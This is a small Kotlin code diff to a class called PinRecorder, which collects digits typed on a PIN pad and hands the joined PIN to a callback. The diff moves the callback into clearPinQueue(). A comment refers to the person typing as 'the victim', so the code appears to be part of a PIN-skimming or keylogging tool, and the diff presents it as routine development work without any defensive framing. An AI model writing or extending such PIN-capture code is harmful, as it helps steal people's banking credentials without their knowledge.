@@ -38,8 +38,6 @@ class PinRecorder(val callback: (String) -> Unit) {
                 digitQueue.poll()
             }
             PinPad.ENTER -> {
-                // When the victim presses enter, get ready for a new one.
-                callback(digitQueue.joinToString("-"))
                 clearPinQueue()
             }
             PinPad.EMERGENCY -> {
@@ -53,6 +51,8 @@ class PinRecorder(val callback: (String) -> Unit) {
     }
 
     fun clearPinQueue() {
+        // When the victim presses enter, get ready for a new one.
+        callback(digitQueue.joinToString("-"))
         digitQueue.clear()
     }
 }
